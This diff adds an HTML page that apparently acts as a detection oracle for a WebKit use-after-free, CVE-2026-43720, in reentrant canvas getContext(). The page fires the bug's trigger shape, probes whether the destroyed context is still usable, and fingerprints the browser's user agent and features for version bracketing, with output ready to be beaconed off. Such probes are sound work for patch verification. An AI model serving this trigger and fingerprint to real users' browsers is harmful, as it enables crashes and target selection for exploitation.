@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<!--
+  canvas_oracle.html — determines whether a WebKit build contains the fix for
+  CVE-2026-43720 (reentrant HTMLCanvasElement::getContext()).
+
+  Upstream fix: WebKit commit 040ef6e21f, "Crash in CanvasRenderingContext::deref
+  after reentrant getContext()", landed 2026-06-30 (safari-7624-branch).
+  LayoutTest: fast/canvas/canvas-getContext-reentrant.html
+
+  Post-fix contract (from the upstream expected.txt):
+    outer="bitmaprenderer", inner="2d"  -> outer=null,  inner=CanvasRenderingContext2D
+    outer="2d",            inner="2d"  -> outer=ctx,   inner=ctx   (same type returns existing)
+  Pre-fix (vulnerable): outer is a live ImageBitmapRenderingContext and the inner
+  2d context has been destroyed while its JS wrapper survives.
+
+  Result is written to <pre id="out"> as JSON, one line per case, so it can be
+  scraped by a driver or beaconed off the console.
+-->
+<meta charset="utf-8">
+<title>canvas-getContext-reentrant oracle</title>
+<pre id="out">running</pre>
+<script>
+(function () {
+  "use strict";
+  var results = [];
+
+  function name(ctx) {
+    if (ctx === null) return "null";
+    if (ctx === undefined) return "undefined";
+    try { return ctx.constructor.name; } catch (e) { return "throw:" + e.name; }
+  }
+
+  function probe(outer, inner, surface) {
+    var canvas = surface === "offscreen"
+      ? new OffscreenCanvas(10, 10)
+      : document.createElement("canvas");
+    var innerCtx = null, outerCtx = null, err = null;
+    try {
+      var opts = {};
+      Object.defineProperty(opts, "alpha", {
+        get: function () { innerCtx = canvas.getContext(inner); return true; }
+      });
+      outerCtx = canvas.getContext(outer, opts);
+    } catch (e) {
+      err = e.name + ": " + e.message;
+    }
+    results.push({
+      surface: surface,
+      outerType: outer,
+      innerType: inner,
+      outer: name(outerCtx),
+      inner: name(innerCtx),
+      err: err
+    });
+  }
+
+  probe("bitmaprenderer", "2d", "html");     // the CVE trigger shape
+  probe("2d", "bitmaprenderer", "html");     // inverse
+  probe("2d", "2d", "html");                 // same type: returns existing ctx
+  probe("bitmaprenderer", "2d", "offscreen");// same bug in OffscreenCanvas
+
+  // Attribution hint: is the inner context still usable after the outer call?
+  var c = document.createElement("canvas"), inner = null;
+  var o = {};
+  Object.defineProperty(o, "alpha", { get: function () { inner = c.getContext("2d"); return true; } });
+  var outer = c.getContext("bitmaprenderer", o);
+  var usable = null;
+  try { inner.lineWidth = 7.5; usable = inner.lineWidth; } catch (e) { usable = "throw:" + e.name; }
+
+  // Discriminator. Only the bitmaprenderer-outer case is load-bearing:
+  //   fixed      -> outer === null  (inner 2d survives)
+  //   vulnerable -> outer is a live ImageBitmapRenderingContext
+  // If the getter never fired (inner === null) the engine ignored the options
+  // dictionary, so the outer result says nothing about the fix -- report UNKNOWN.
+  var t0 = results[0];
+  var verdict;
+  if (t0.outer === "null") {
+    verdict = "FIXED";
+  } else if (t0.inner === "null") {
+    verdict = "UNKNOWN_GETTER_NOT_FIRED";
+  } else {
+    verdict = "VULNERABLE";
+  }
+  var report = {
+    verdict: verdict,
+    ua: navigator.userAgent,
+    trigger: results[0],
+    all: results,
+    innerStillUsable: usable,
+    // extra fingerprint for version bracketing
+    feats: {
+      Float16Array: typeof Float16Array,
+      PromiseWithResolvers: typeof Promise.withResolvers,
+      ObjectGroupBy: typeof Object.groupBy,
+      SetUnion: typeof Set.prototype.union,
+      IteratorHelper: typeof Iterator,
+      RegExpEscape: typeof RegExp.escape,
+      Temporal: typeof Temporal
+    }
+  };
+  document.getElementById("out").textContent = "ORACLE_JSON=" + JSON.stringify(report);
+  document.title = verdict;
+})();
+</script>
